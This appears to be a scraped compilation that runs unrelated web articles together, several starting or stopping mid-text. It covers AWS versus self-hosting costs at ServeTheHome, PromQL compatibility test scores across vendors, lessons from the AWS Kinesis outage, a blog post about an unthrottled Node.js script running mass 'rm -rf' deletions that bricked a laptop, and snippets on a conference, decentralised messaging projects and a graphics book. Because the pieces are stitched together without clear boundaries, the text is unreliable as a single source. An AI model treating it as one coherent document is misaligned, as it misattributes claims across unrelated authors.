<p>Fourth, we are going to add a mix of AMD EPYC and Intel Xeon instances roughly about what we use for our hosting. We are heavily weighting the larger instances toward the EPYC instances since that helps bring down the costs and for our workloads, there is no appreciable difference. We could go Arm, but that requires some small lift and shift work.</p>
<p>Finally, we do use some AWS services. Those services we would use regardless so we are excluding them from the analysis. We are also not modeling services such as Mailchimp which handles our weekly newsletter, Teespring that handles our online merch shop, YouTube which hosts our videos, and so forth.</p>
<h3>AWS Cost 1-Year Reserved No Upfront</h3>
<p>Here is the calculator for the absolute base setup for our hosting using 1-year reserved upfront instances:</p>
<figure id="attachment_48851" aria-describedby="caption-attachment-48851"><a href="https://www.servethehome.com/falling-from-the-sky-2020-self-hosting-still-pays/2020-aws-calculator-1-year-reserved-no-upfront/" rel="attachment wp-att-48851"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/2020-AWS-Calculator-1-Year-Reserved-No-Upfront.jpg" alt="2020 AWS Calculator 1 Year Reserved No Upfront" width="1114" height="222" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/2020-AWS-Calculator-1-Year-Reserved-No-Upfront.jpg 1114w, https://www.servethehome.com/wp-content/uploads/2020/11/2020-AWS-Calculator-1-Year-Reserved-No-Upfront-400x80.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/11/2020-AWS-Calculator-1-Year-Reserved-No-Upfront-800x159.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/11/2020-AWS-Calculator-1-Year-Reserved-No-Upfront-696x139.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/11/2020-AWS-Calculator-1-Year-Reserved-No-Upfront-1068x213.jpg 1068w" sizes="(max-width: 1114px) 100vw, 1114px"></a><figcaption id="caption-attachment-48851">2020 AWS Calculator 1 Year Reserved No Upfront</figcaption></figure>
<p>As you can see, our hosting costs are just under $4,300 per month.</p>
<h3>AWS Cost 1-Year Reserved Partial Upfront</h3>
<p>Swapping to 1-year reserved partial up-front on the instances helps bring pricing down a bit albeit with a $19,512 up-front cost.</p>
<figure id="attachment_48853" aria-describedby="caption-attachment-48853"><a href="https://www.servethehome.com/falling-from-the-sky-2020-self-hosting-still-pays/2020-aws-calculator-1-year-partial-upfront/" rel="attachment wp-att-48853"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/2020-AWS-Calculator-1-Year-Partial-Upfront.jpg" alt="2020 AWS Calculator 1 Year Partial Upfront" width="1112" height="242" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/2020-AWS-Calculator-1-Year-Partial-Upfront.jpg 1112w, https://www.servethehome.com/wp-content/uploads/2020/11/2020-AWS-Calculator-1-Year-Partial-Upfront-400x87.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/11/2020-AWS-Calculator-1-Year-Partial-Upfront-800x174.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/11/2020-AWS-Calculator-1-Year-Partial-Upfront-696x151.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/11/2020-AWS-Calculator-1-Year-Partial-Upfront-1068x232.jpg 1068w" sizes="(max-width: 1112px) 100vw, 1112px"></a><figcaption id="caption-attachment-48853">2020 AWS Calculator 1 Year Partial Upfront</figcaption></figure>
<p>When we factor in the up-front we get a $4,137.63 monthly cost along with a $49,651.56 total annual cost for the year. We are not discounting here using future values/ present values. There is a big issue with this. Typically, we tend to see our servers run for years. To model that, we tend to use 3-year reserved partial upfront.</p>
<h3>AWS Cost 3-Year Reserved Partial Upfront</h3>
<p>Using the 3-year reserved partial upfront on the instances gives us a much lower operating cost with a larger up-front payment.</p>

<p>First off, the $39,020 is more than we have spent in the last three years on hosting hardware. We do not purchase machines with long warranties or high markups, so if you are buying the average Dell/ HPE/ Lenovo server and think that sounds like a single server, you are trading higher upfront costs for service contracts. Given what we have seen on hardware/ remote hands, it is not a model we are pursuing. On the operating side, we get down to $1,968.51 per month which is great.</p>
<h2>STH 2020 Hosting Budget</h2>
<p>Next year, we will likely do two small changes. First, we will upgrade database nodes and instead of using Optane SSDs, we will move to Cascade Lake and Optane PMem DIMMs into the database servers and upgrade a few older nodes to AMD EPYC 7002 “Rome” systems. We are testing the Ampere Altra 80-core server right now, and we are at the point where we might consider using Arm in the hosting cluster this year. We are going to increase our hardware budget to $10,000 this year. Although we did not use most of our hardware budget in 2019 nor 2020, we expect to in 2021.</p>
<p>Making up our monthly cost, we increased a bit for inflation. We used a $895/ mo budget in 2018. Our costs are effectively flat, but we are going to assume a bit more labor to install servers/ upgrade the hardware.</p>
<figure id="attachment_48855" aria-describedby="caption-attachment-48855"><a href="https://www.servethehome.com/falling-from-the-sky-2020-self-hosting-still-pays/2020-aws-v-self-hosting/" rel="attachment wp-att-48855"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/2020-AWS-v-Self-Hosting.jpg" alt="2020 AWS V Self Hosting" width="685" height="197" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/2020-AWS-v-Self-Hosting.jpg 685w, https://www.servethehome.com/wp-content/uploads/2020/11/2020-AWS-v-Self-Hosting-400x115.jpg 400w" sizes="(max-width: 685px) 100vw, 685px"></a><figcaption id="caption-attachment-48855">2020 AWS V Self Hosting</figcaption></figure>
<p>We are budgeting $22,000 per year or around $1833.33 per month. This is about the same as we would need for EC2’s 3-year partial upfront reserved instance, albeit without the up-front costs.</p>
<p>The one item that skews this substantially, is that we are not replacing every node every year. We are now in a very different place than we were when we started this journey. We have existing infrastructure that is frankly fine from a performance and node count standpoint even though we have relatively under-invested over the past 32 months. We had budgeted around $1687/ month for the last two months and spent under $1000. Still, at some point, we like to replace equipment before it fails.</p>
<h2>Final Words</h2>
<p>There is clearly a lot going into this. We now have just under 8 years since this 10U colocation spot in Las Vegas was our first setup:</p>

<p>What is not reflected in our discussion is all of the lessons learned along the way. Also, as hardware has gotten faster, and memory prices have decreased, the cost of self-hosting has gone down significantly for our applications. We are also taking advantage of falling bandwidth prices. While AWS is absolutely the right choice for many applications, and indeed we use them, for our web hosting it is not what we want for a simple and inexpensive setup. This may not be the perfect analysis, but it is a little bit of how we now look at hosting at STH.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Prometheus's query language <a href="https://prometheus.io/docs/prometheus/latest/getting_started/">PromQL</a> is one of the cornerstones of the Prometheus ecosystem. Back in our August blog post, <a href="https://promlabs.com/blog/2020/08/06/comparing-promql-correctness-across-vendors">Comparing PromQL Correctness Across Vendors</a>, we looked at several external projects and monitoring vendors that claimed to offer PromQL-compatible APIs. Using an <a href="https://github.com/promlabs/promql-compliance-tester">open-source compliance checker tool</a>, we evaluated each implementation by running a set of test queries against both the native Prometheus server and the vendor implementation. As a result, we found multiple bugs in the tested projects, and mapped out in detail how each deviated from the upstream implementation.</p>
<p>Meanwhile, more vendors have entered the PromQL space, while existing projects have worked on improving their PromQL support as a result of our last blog post. Today, we are presenting an updated set of PromQL test results both for existing projects and a couple of new ones. We tested each of these implementations against the latest Prometheus version, <a href="https://github.com/prometheus/prometheus/releases/tag/v2.23.0">v2.23.0</a>.</p>
<h3 id="before-we-start-a-note-on-interpreting-test-scores"><a href="#before-we-start-a-note-on-interpreting-test-scores" aria-label="before we start a note on interpreting test scores permalink"></a>Before we start: a note on interpreting test scores</h3>
<p>When looking at individual test results, please note that the numeric scores alone paint a limited picture. They don't necessarily tell you how impactful implementation errors are, nor how many distinct behavioral differences there are. Since PromQL expressions naturally compose and build on top of each other, it is infeasible to isolate all possible query errors into fully independent test cases. Many of the test queries will contain the same constructs as other queries, in a nested way. For example: If an implementation selects data incorrectly, then this breaks not only a simple data selection test query, but also all other test query cases that try to run a function, operator, or other transformation based on selected data. The test cases also include a lot of variations of the same type of query, but with different ranges, quantile values, or other parameters. So if e.g. a function is broken in a general way, it may cause multiple test case variants to fail at the same time.</p>
<p>Another matter of more subtle interpretation are vendor extensions and extreme edge-case behavior. For example, a vendor may choose to not raise an error when executing a function with a parameter value that is illegal in native PromQL, but legal and sensical in the extended language. Or a vendor may return a different value for an unusual edge-case behavior, such as running <code>histogram_quantile()</code> with a quantile value larger than <code>1</code>.</p>
<p>We still provide the numeric test scores as a quick way to map out the vendor landscape and to motivate the ecosystem towards achieving a 100% score. But if you need to understand behavioral differences in more depth, please <a href="https://promlabs.com/promql-compliance-tests">take a look at the full test results</a> and read on for the details.</p>
<h3 id="criteria-for-including-a-vendor-in-tests"><a href="#criteria-for-including-a-vendor-in-tests" aria-label="criteria for including a vendor in tests permalink"></a>Criteria for including a vendor in tests</h3>
<p>We are always on the lookout for new PromQL implementations to include in these tests. To include a project or vendor, we look for two criteria:</p>
<ul>
<li>Someone is either advertising full or partial PromQL compatibility of their system, and/or otherwise positioning their solution as a drop-in replacement for an existing PromQL implementation.</li>
<li>For practical purposes, we need to be able to ingest test data into the system and query it back via a PromQL-style HTTP API. Otherwise, we can't run any tests.</li>
</ul>
<p>Unfortunately, some vendors failed the second criterium for now, so we couldn't include them:</p>
<ul>
<li><a href="https://sysdig.com/">Sysdig</a> <a href="https://docs.sysdig.com/en/using-promql.html">advertises PromQL support</a>, but has no <code>remote_write</code> protocol support to ingest arbitrary test data. According to contacts at Sysdig, <code>remote_write</code> may be supported at some point in the future, but we couldn't get a recent update on its availability timeline.</li>
<li><a href="https://www.vmware.com/de/company/acquisitions/wavefront.html">Wavefront</a> <a href="https://docs.wavefront.com/wavefront_prometheus.html">advertises partial PromQL support</a>, but they lack an HTTP endpoint against which to run test queries. Their PromQL support is only available within their own user interface so far, which makes it difficult to test against. However, judging by the various compatibility caveats listed in their documentation, we do not expect that they would reach a high test score if we could test them.</li>
</ul>
<p>We hope to be able to test even more vendors in the future.</p>
<p><strong>UPDATE:</strong> After publishing, we received questions about PromQL support in two more vendors:</p>
<ul>
<li><a href="https://www.influxdata.com/products/influxdb/">InfluxDB</a> once <a href="https://github.com/influxdata/promql">started implementing PromQL support</a> (coincidentally with the help of the author of this blog post), but as far as we are aware, this effort has been paused and PromQL support in InfluxDB is neither currently available nor is it being advertised.</li>
<li><a href="https://www.elastic.co/">Elastic</a> recently <a href="https://www.elastic.co/blog/elastic-metrics-7-7-0-released">advertised PromQL support in Elastic Metrics</a>. However, the announced feature is only about Elastic Metrics being able to run queries against an <em>existing</em> external PromQL endpoint (such as Prometheus) to then ingest the query result as metrics into Elasticsearch. There is no way to run PromQL on the resulting data stored in Elasticsearch itself.</li>
</ul>
<h3 id="minor-updates-to-the-test-query-set"><a href="#minor-updates-to-the-test-query-set" aria-label="minor updates to the test query set permalink"></a>Minor updates to the test query set</h3>
<p>Since the last testing round in August, we made minor changes to the test query set:</p>
<ul>
<li>For queries that looked at the absolute values of counter metrics (e.g. with no <code>rate()</code> or similar counter-related function applied), we changed the selected metrics to be gauges instead. This helps keep test cases somewhat more independent for a vendor like New Relic, which does not support storing or retrieving absolute values for counters.</li>
<li>We added a query selecting an intermittently present series to test whether <a href="https://prometheus.io/docs/prometheus/latest/querying/basics/#staleness">staleness handling</a> works.</li>
</ul>
<h3 id="lets-get-started-updated-comparisons"><a href="#lets-get-started-updated-comparisons" aria-label="lets get started updated comparisons permalink"></a>Let's get started: Updated comparisons</h3>
<p>In this round of tests, we tested the following projects and vendors, in alphabetical order:</p>
<ul>
<li><a href="https://chronosphere.io/">Chronosphere</a> - A hosted monitoring and observability platform.</li>
<li><a href="https://cortexmetrics.io/">Cortex</a> - An open-source, horizontally scalable reimplementation of Prometheus.</li>
<li><a href="https://grafana.com/products/cloud/">Grafana Cloud</a> - A hosted monitoring and observability service.</li>
<li><a href="https://m3db.io/">M3</a> - An open-source metrics engine and time series database.</li>
<li><a href="https://www.metricfire.com/">MetricFire</a> - A hosted monitoing and observability service.</li>
<li><a href="https://newrelic.com/">New Relic</a> - A hosted monitoring and observability service.</li>
<li><a href="https://thanos.io/">Thanos</a> - An open-source project to provide query aggregation for long-term storage and HA on top of Prometheus.</li>
<li><a href="https://github.com/timescale/promscale">Promscale</a> (<a href="https://www.timescale.com/">TimescaleDB</a>) - An open-source project to store Prometheus data in TimescaleDB.</li>
<li><a href="https://victoriametrics.com/">VictoriaMetrics</a> - An open-source time-series database and monitoring system.</li>
</ul>
<p>Let's look at the test results for each of these systems:</p>
<h4 id="chronosphere"><a href="#chronosphere" aria-label="chronosphere permalink"></a>Chronosphere</h4>
<p>Chronosphere does not have a self-service account creation system yet, but they helpfully provided us with a test account with <code>remote_write</code> and PromQL HTTP API support. Chronosphere is built on top of M3 (tested below), so we expected similar test results for the two. After an initial test run against an outdated test environment using an older M3 version, Chronosphere updated our test account and we achieved a test score of <strong>100%</strong> against it.</p>
<h4 id="cortex"><a href="#cortex" aria-label="cortex permalink"></a>Cortex</h4>
<p>Last time we tested Cortex we encountered two minor issues: floating-point input timestamps were <a href="https://github.com/cortexproject/cortex/issues/2932">not rounded in the same way</a> as in Prometheus, and the system did not <a href="https://github.com/cortexproject/cortex/issues/416">support executing queries without a metric name</a>. The first issue has been resolved entirely, while the second one is being addressed by a new storage mode in Cortex - the new <a href="https://cortexmetrics.io/docs/blocks-storage/">blocks storage mode</a> vs. the older <a href="https://cortexmetrics.io/docs/chunks-storage/">chunks storage mode</a>.</p>
<p>Let's look at <a href="https://github.com/cortexproject/cortex/releases/tag/v1.5.0">version 1.5.0 of Cortex</a> and see what scores each of these modes received:</p>
<h6 id="cortex-with-chunks-storage"><a href="#cortex-with-chunks-storage" aria-label="cortex with chunks storage permalink"></a>Cortex with chunks storage</h6>
<p>When testing Cortex with the old chunks storage, we can now remove the query tweak to align input timestamps, since that bug has been fixed. Other than that, we still get the same test score of <strong>99.62%</strong> due to the chunks mode not supporting queries without metric names.</p>
<h6 id="cortex-with-blocks-storage"><a href="#cortex-with-blocks-storage" aria-label="cortex with blocks storage permalink"></a>Cortex with blocks storage</h6>
<p>Cortex with blocks storage mode now also does not require any query tweaks anymore and passes with a score of <strong>100%</strong>.</p>
<h4 id="grafana-cloud"><a href="#grafana-cloud" aria-label="grafana cloud permalink"></a>Grafana Cloud</h4>
<p>Grafana Cloud is a new test candidate that <a href="https://grafana.com/docs/grafana-cloud/metrics/prometheus/">advertises full hosted Prometheus functionality</a>. Under the hood, Grafana Cloud uses Cortex to offer this service. According to representatives from Grafana Labs, they are in the process of phasing out the last (shared) chunks-based Cortex cluster, while all new Cortex clusters are already using blocks as their storage mode.</p>
<p>To be able to cache PromQL queries, Grafana Cloud aligns incoming query start and end timestamps to the query resolution step width (10 seconds in our case). This is currently not configurable on the Grafana Cloud side, so we had to apply a cross-cutting query tweak to align input timestamps to our reference Prometheus server in the same way, to get comparable results.</p>
<p>With this in mind, we tested a Grafana Cloud account via <code>remote_write</code> and their Prometheus-style HTTP query API on both the remaining legacy cluster and a new dedicated blocks-storage cluster, and we got the same <strong>99.62%</strong> and <strong>100%</strong> test scores as for Cortex itself. Since the chunks-mode cluster is being retired this month, we count that as an overall <strong>100%</strong> score for Grafana Cloud.</p>
<h4 id="m3"><a href="#m3" aria-label="m3 permalink"></a>M3</h4>
<p>M3 is also a new candidate in this group that states, "M3 can be used as Prometheus Remote Storage and has 100% PromQL compatibility", <a href="https://m3db.io/">on its homepage</a>. Its documentation also mentions <a href="https://m3db.github.io/m3/integrations/prometheus/">Prometheus and PromQL integrations</a> that include <code>remote_write</code> support and a PromQL HTTP API endpoint. Using these with M3 version v1.0.0, we ran our test suite and received a test score of <strong>100%</strong>.</p>
<p><strong>Note:</strong> For PromQL to work 100% the same as in Prometheus, we had to ensure that our test query was only hitting raw, non-aggregated data in M3 (vs. data that has been downsampled into a lower resolution). We did this by not configuring any aggregation in our test M3 database.</p>
<h4 id="metricfire"><a href="#metricfire" aria-label="metricfire permalink"></a>MetricFire</h4>
<p>MetricFire, a hosted service by the people behind <a href="https://www.hostedgraphite.com/">hostedgraphite.com</a>, is still pretty new in the Prometheus space. While MetricFire documents how to write data into the system using the <code>remote_write</code> protocol, there is no officially supported way to run external PromQL queries against the collected data using an HTTP API yet. However, MetricFire representatives kindly explained a way to do this. We won't detail it here, but we expect that there will be a documented public HTTP API soon. In our talks with MetricFire we learned that they also use Cortex to back their service, and we also …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<h3>[ 2020-December-01 09:57 ]</h3>
<p>I love reading post-mortem analyses, because there is a lot to learn both about how systems are designed, and how they fail. On November 25th 2020, AWS Kinesis had a 17 hour outage that affected other AWS services, and customer services built on top of AWS. The <a href="https://aws.amazon.com/message/11201/">post-mortem is excellent, with a lot of interesting details about how this service, and other services at AWS work</a>. I wrote myself some notes with the lessons I think we can learn from this outage. I would like to point out that this does not mean I think the AWS teams did a bad job in any way. It is very easy to point out weaknesses after something has failed. It is much harder to figure out which of the infinite weaknesses in a system you should prioritize in advance. However, we should try our best to learn from examples like this, to attempt to be able to predict how things will fail in the future, and get better and handling the inevitable failures that do occur.</p>

<dl>
<dt>Check limits/quotas carefully</dt>
<dd>Robust systems need limits on all critical resources, so that unexpected events cause specific requests to fail, rather than crash the entire system. However, these limits are also frequent causes of outages. In this case, Kinesis ran into an operating system thread limit. It is very hard to know in advance which limits matter and which do not, since there are probably thousands of limits that might apply in a software system like this. However, this is a good reminder that a useful reliability exercise is to consider what limits a system might run into, and at least ensure you can estimate if you might be approaching these limits. When adding new limits, it is also worth thinking about how to report or warn operators that a system is approaching these limits, so that it can be investigated before it is a critical problem.</dd>

<dt>O(N<sup>2</sup>) resource usage is potentially dangerous</dt>
<dd>In this Kinesis incident, one front-end server has at least one thread for each other front-end server, which is O(number of servers). However, in aggregate, the usage is O(N<sup>2</sup>). Another way to think about this is adding one front-end increases the number of threads on every other server. I generally support using the simplest possible implementation (e.g. see <a href="https://www.evanjones.ca/linear-search.html">my article about the unreasonable effectiveness of linear search</a>). However, any resource usage that scales worse than linearly should be monitored carefully, since it is likely to fail catastrophically with a modest amount of growth. Amazon's solution to this is "cellularization", which is effectively creating a two-level hierarchy. I suspect inside each cell, there will still be all-to-all communication. However, the cells are size limited. At the next level, you could repeat the same all-to-all pattern, except only once for each cell, which reduces N by a large factor. This is a bit similar to how Internet routing scales. In that case, local Ethernet networks use broadcast to find where to send messages, but multiple Ethernet networks are connected by routers, where only the routers talk to each other.</dd>

<dt>Be able to deploy and revert quickly</dt>
<dd>The most common cause of outages is change, and the most consistent tool for fixing them is undoing that change. These operations should be fast, so that you can reduce the mean time to repair (MTTR) of outages, by either quickly rolling back changes, or being able to deploy a bug fix or corrected configuration change. For stateful services, making deploys or restarts work quickly can be very hard, but it is worth trying. In the case of Kinesis, "It takes up to an hour for any existing front-end fleet member to learn of new participants". This seems related to the fact that restarting everything "would be a long and careful process". This meant it took about 17 hours to recover from this outage. If instead a fleet-wide restart took 1 hour, they would have been able to recover the service by around 10 AM PST instead of 10 PM PST, reducing a 17 hour outage to 5 hours. It is also worth noting that deploying too quickly can also be problematic, since it can mean you deploy a bug everywhere, instead of only affecting a small portion of your service. However, in case of emergencies, it is useful to have the ability to rush out a change.</dd>

<dt>Fallback mechanisms are dangerous</dt>
<dd>The Amazon Cognito service also failed, because it sends data to Kinesis. Interestingly, they had a fallback mechanism: it buffers data locally, any only discards data when the local buffer is full. This is a classic fallback mechanism, which is only used in the rare case of failure. It seems like adding this mechanism should <em>improve</em> the reliability of a system. However, fallback mechanisms are extremely dangerous because they are almost never used. This means they are much more likely to have bugs. In this case, when the buffer is full, the code using the buffer blocked forever, which took down the service. If Cognito had not built this buffer, it probably would have had to immediately discard data on any Kinesis error. This would probably mean that Cognito would be more likely to drop data in general, as it would not tolerate any small Kinesis delays or errors. However, it would have been less engineering effort, and would have avoided this outage entirely. If you really must have a fallback, you should make sure you test it continuously and automatically. If you can only test a rare failure scenario manually, then inevitably bugs will creep in as the code evolves and people forget to run the tests. Ironically, the <a href="https://aws.amazon.com/builders-library/avoiding-fallback-in-distributed-systems/">AWS "builder's library" has a great article about avoiding fallback and "why we almost never use them at Amazon."</a> This specific error involved a queue, which is a frequent cause of a related issue: in normal operation, queues are empty and delays are low. However, when issues occur, the queues fill up, which causes significant delay. The <a href="https://aws.amazon.com/builders-library/avoiding-insurmountable-queue-backlogs/">challenges of dealing with the bimodal behaviour of queues are described in detail in another good AWS Builder's Library article</a>.</dd>

<dt>Critical systems must be as simple as possible</dt>
<dd>Amazon's status page continued to work during this incident, but Amazon had trouble updating it, because the workflow that updates it uses Cognito. A system which is intended to work even when other parts the system is down, like a status page, needs to be as simple as possible. The fact that the status page was still operating correctly is excellent. In particular, the serving system seems to be separate from the update system. This is an example of robust design, and mechanisms functioning as intended. However, the fact that the update system depends on Cognito is potentially problematic. In particular, this means the update system can't be used to report errors in Cognito itself. It is worth being aware of what dependencies systems like this have, so you can decide if this dependency is acceptable or not.</dd>

<dt>Practice and streamline any process that people may need during an outage</dt>
<dd>Amazon could not update the status page, since updating it depended on a system that was down. They had a manual alternative process that explicitly avoided this dependency, however "we encountered several delays [...] as it is a more manual and less familiar tool for our support operators". This is both a good and bad example. They knew the normal system had a high risk of being broken during certain types of outages, and had designed a fallback. Unfortunately, the fallback did not work as intended (because fallbacks are dangerous, see above). If a fallback involves people, you need to regularly practice this kind of failure, to ensure everyone on your team knows how to find the documentation, and can execute the necessary steps. This is like regularly testing backups by actually restoring them. If you don't, you are highly likely to find that your backups do not work, or require a very long time to restore.</dd>

<dt>Don't forget to scale up as well as out</dt>
<dd>Historically, the primary way to handle more users or work was to move an application to a bigger computer. In the last ~10-20 years, the pendulum has swung the other way, with most systems designed to run on multiple separate computers. In many cases, this means we are running individual instances of our applications with too few resources. When your application gets big enough, make sure you re-evaluate the resources you are giving each individual instance. Managing a small number of large instances can be more efficient than large numbers of small instances. It may also be more reliable, because you are less likely to hit some scaling limits. This is less important than the other points, but for both cost and reliability reasons, it is worth periodically re-evaluating the resources you are giving your largest applications. Running a smaller number of bigger instances would have avoided this outage, or at least deferred it. The post-mortem notes the team was already working on cellularization, so in an ideal world, running on larger instances could have deferred this outage until the cellularization was completed.</dd>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>The simple back story is that I had to write a script to delete a bunch of unnecessary files.
Recently I had to shutdown 35 servers on Digital Ocean that I had set up for a class I was teaching. I wanted to preserve the student's code, so I scp'd all of it to my laptop. However I unnecessarily copied over the <code>node_modules</code> folders as well as a bunch of hidden folders that were full of files. Deleting these manually would of taken forever. Thus I wrote a script. Here is the code that I wrote:</p>
<pre><code>const child_process = require('child_process')
	, fs = require('fs')
	, path = require('path')
;

const unwantedFolders = ['.ssh', '.npm', '.ipynb_checkpoints'
		, '.keras', '.cache', 'code/node_modules', '.ipython'
		, '.nvm', '.local', '.bashrc', '.bash_history']
	, servers = [...'12345']
		.fill([...'1234567'])
		.flat().map((s, i) =&gt; `/Users/peach/servers/server${i+1}`)
	, filesToDelete = servers
		.map(s =&gt; unwantedFolders.map(u =&gt; path.join(s,u)))
		.flat()
;

filesToDelete.forEach(file =&gt; {
	child_process.exec(`rm -rf "${file}"`, (er, so, se) =&gt; {
	});
});

</code></pre>
<p>Do you see something embarrassingly wrong? Well I forgot to limit the concurrency of the delete commands. I blame caffeine. Thus my Mac tried to spin up 385 child processes all at once. Each one tasked to recursively delete a folder with up to 10,000 files. My Mac's fans started to spin up fast, heated up, and then crashed. It completely shut off. When it rebooted, it no longer drew power from any of the 4 ports. I tried both chargers I had to no avail. Also tried different outlets with no luck. After 1 hour, my remaining battery powered died and my Mac Book Pro became an irreparable brick.</p>
<p>Luckily I have a Linux laptop that has been my work horse. A year ago it also had a charging issue and I was able to fix it myself. For me personally the only reason why I had bought the 2018 Mac Book Pro, was so that I can use the same computer as my students. After hearing this story, I hope more of them will buy a repairable Linux laptop.</p>

        <strong>Rebase</strong> is a new conference for and by practitioners who want to engage academics about tomorrow's technologies while fondly recalling the achievements of yesterday.
      </p>
      
      <p>
        This year, <strong>Rebase</strong> was planned to occur twice, once in Berlin
        with the <a href="https://2020.ecoop.org/">ECOOP</a> conference and
        once in Chicago with the <a href="https://2020.splashcon.org/">SPLASH</a> conference.
        Due to outside forces, there will be a single virtual event.
      </p>
      
      <p>
        <strong>Rebase</strong> will use the Clowdr platform for interaction,
        registration allows attendees to ask questions and meet with each other
        and with speaker. Registration also give access to all of the
        <a href="https://2020.splashcon.org/">SPLASH</a> co-located events.
      </p>
      
      <p>
        <strong>Rebase is free. All talks were streamed live and are now available on <br> <a href="https://www.youtube.com/playlist?list=PLyrlk8Xaylp6aNlOgiyE4W30X7DpXx74m"><i></i>&nbsp;YouTube</a>.</strong>

                                        <p>The list of released NORACO projects now grows to three! <a href="http://noraco.org/projects/xp001/">Internet Pockets</a> were inspired by the concept of registers in microprocessors. They're registers for the internet that can be used to temporarily hold small bits of data. Pockets are represented by an IP address and a port number. They can be hosted by anyone; a single computer can host tens, hundreds, or even thousands of pockets. A single pocket can hold up to 1,024 characters of text, and they're kept in main memory. If the computer (or the Pockets daemon) is restarted, all the pockets lose their data.</p>
                                        <p>A pocket can be written to or read from. Pockets were designed to be protocol-less, meaning they don't require a special protocol or API to use. To write to a pocket, you send your data to its port number over UDP. To read from one, you simply connect to that same port number over TCP. The pocket dumps back its contents and closes the connection. A write operation on a pocket overwrites any data currently stored within it. Pockets on the same machine would typically have successive port numbers (gaps may occur if a port is already reserved by another program somewhere in the middle of the port range). If you need to store more than 1,024 characters of text, you may break your text into chunks and store it across multiple pockets.</p>
                                </article><article id="1">
                                        
                                        <p>After years of independent research and development, I'm pleased to announce the general availability of <a href="http://noraco.org/projects/xp002/">Nomicle</a>, a decentralised, identity-based, cryptography system, and <a href="http://noraco.org/projects/hp001/">xTalk</a>, a decentralised, inter-app messaging system designed to work with Nomicle.</p>
                                        <p>I originally conceived them as a single system but then decided it's better to split them up because identity is the crux of the problem and messaging is just a layer on top that uses it. It's based on cryptographic keys with one major property: keys are paired with arbitrary mnemonic strings, e.g. your favourite username, so apps can send messages in a peer-to-peer fashion addressed to the strings directly without having to worry about IP addresses. These key-string pairs can be generated on the fly on any computer and there's no central database that anybody can control. When multiple people inevitably choose the same strings as their personal identifiers, e.g. 5 people choose 'alice', the system has a consensus mechanism for resolving such conflicts across the entire network so 'alice' will always point to one public key that all nodes will use at a given point in time for encryption and signature verification. This means that only that specific 'alice' will receive any messages sent to that identifier. The other 4 people won't be able to read them.</p>
                                        <p>Basically, imagine if by knowing one identifier that you've publicised as being yours, I can...</p>
                                        <ul>
                                                <li>Type it into an xTalk-enabled web browser to find your personal website (the web server software you're using to host it would simply need to add support for responding to DNS-like requests coming from xTalk in addition to listening on port 80 for your usual HTTP requests; i.e. your web server also becomes something like your own DNS server that responds with its IP address over xTalk to whoever requests it so that they may then connect to it over port 80 like a standard web request).</li>
                                                <li>Use it in an xTalk-enabled messenger to contact you.</li>
                                                <li>Use it in an xTalk-enabled BitTorrent client to download files from you.</li>
                                        </ul>
                                        <p>No passwords involved, no creating user accounts anywhere. Your one private key makes all this possible and it is yours to keep on your own machine. These scenarios are just off the top of my head right now. The web browser example seems to work because it's one of the demos I've written. Obviously I haven't tested it in the real world so I can't say how fast web requests would load in practice. I also wrote an xTalk-enabled web app demo that serves a standard web page with a contact form on it for sending short messages. When you submit the form, it forwards your message on to xTalk. The recipient can read your message through a web interface or even Telnet once they receive it.</p>
                                        <p>It's all written in Python. Nomicle's code includes a Python library as well as a C library that developers can use to integrate it into their apps. I'm trying to make it as easy and simple as possible for anyone to pick up. These are the first projects in a pipeline of open source projects that build on this work and that I intend to work on and release in the near future. Messaging is one potential use of Nomicle, but I can already see more uses such as consensus-based packet routing and information publishing. In fact, the latter is the next project I'll be working on.</p>
                                        <p>The xTalk code repository also includes an xTalk-enabled web server/browser demo called Foam and a Flask web app that shows how a standard web app can make use of xTalk. The server hosting noraco.org is currently the world's first Nomicle and xTalk installation, and its nomicle repository is publicly available over HTTP as well at <samp>http://noraco.org/projects/xp002/instance/blocks/&lt;identifier_hash_here&gt;.ncle</samp>. <a href="http://noraco.org/projects/xp002/instance/blocks/48508b092dfa59c4d9d8f6423c9f17935295641363f86c163a0ee580489393c4.ncle">Here's my nomicle</a>.</p>
                                        <p>I have long believed that information should be free, hence why I launched the NORACO initiative and made the source code of its projects freely available to all. <a href="https://github.com/noraco">Everything's currently on GitHub</a>. Feel free to download the programs and run them (I've written guides for each one, which you can find on each project's main page). Go ahead and send me a message via xTalk! Address it to <samp>mail@mahoukov</samp> (follow the steps in the <a href="http://noraco.org/projects/hp001/docs/qsg.html">xTalk Quick Start Guide</a> for sending a message, but use my address). It may look like you can't do much yet with this software, but this is a start. I'm excited to see what new uses and applications others might come up with.</p>

<p>
No Starch Press is publishing a book based on this website in early 2021. Stay tuned!
</p>
<p><strong>TL;DR:</strong> This book will <em>not</em> teach you how to use OpenGL or DirectX; instead, it can teach you how OpenGL and DirectX <em>work</em>. In practice you won’t write a software renderer for production use, but understanding how and why a renderer works will let you use OpenGL and DirectX more effectively.</p>
<p>Computer Graphics is a fascinating topic - how do you make <em>Toy Story</em> out of algorithms and some geometric data? Interestingly enough, it’s a mysterious topic not only for the average cinema fan, but also for world-class engineers who just haven’t been exposed to it.</p>
<p>Computer Graphics is also a frighteningly broad topic. From 3D rendering to photographic image filters, from fonts to particle systems, there’s a multitude of disciplines that can be categorized under CG. This work focuses exclusively on 3D rendering.</p>
<p><strong>Computer Graphics from scratch</strong> is my humble attempt to demystify that slice of Computer Graphics in an accessible way. It can be easily understood by high-school students, while covering the same topics of an university course. It is, in fact, based on my years of teaching the subject at my university.</p>
